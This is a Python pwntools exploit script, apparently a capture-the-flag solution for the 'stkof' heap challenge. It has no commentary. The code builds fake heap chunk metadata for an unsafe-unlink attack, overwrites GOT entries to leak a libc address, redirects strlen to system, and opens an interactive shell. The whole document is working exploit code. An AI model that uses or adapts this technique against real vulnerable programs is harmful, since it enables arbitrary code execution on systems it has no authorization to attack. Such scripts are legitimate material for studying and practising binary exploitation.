from pwn import *

def alloc(size):
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK\n')

def write(idx, data):
    r.sendline('2')
    r.sendline(str(idx))
    r.sendline(str(len(data)))
    r.send(data)
    r.recvuntil('OK\n')

def free(idx):
    r.sendline('3')
    r.sendline(str(idx))
    r.recvuntil('\n')

def leak(idx):
    r.sendline('4')
    r.sendline(str(idx))
    return r.recvuntil('\n', drop=True)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF('./stkof')
r = process('./stkof')

alloc(0x80) # 1: 0x602148
alloc(0x80) # 2: 0x602150
alloc(0x80) # 3: 0x602158
alloc(0x80) # 4: 0x602160

payload  = p64(0) * 2
payload += p64(0x602150 - 0x18) # fd
payload += p64(0x602150 - 0x10) # bk
payload += p64(0) * 12
payload += p64(0x80) # prev_size
payload += p64(0x90) # PREV_INUSE

write(2, payload)
free(3)

payload  = p64(0) * 2
payload += p64(elf.got['fgets'])
payload += p64(elf.got['strlen'])
write(2, payload)

payload  = p64(elf.plt['puts'])
write(2, payload)

fgets_leak = u64(leak(1).ljust(8, '\x00'))

libc.address = fgets_leak - libc.symbols['fgets']

payload  = p64(libc.symbols['system'])
write(2, payload)

payload = "sh"
write(4, payload)

leak(4)

r.interactive()
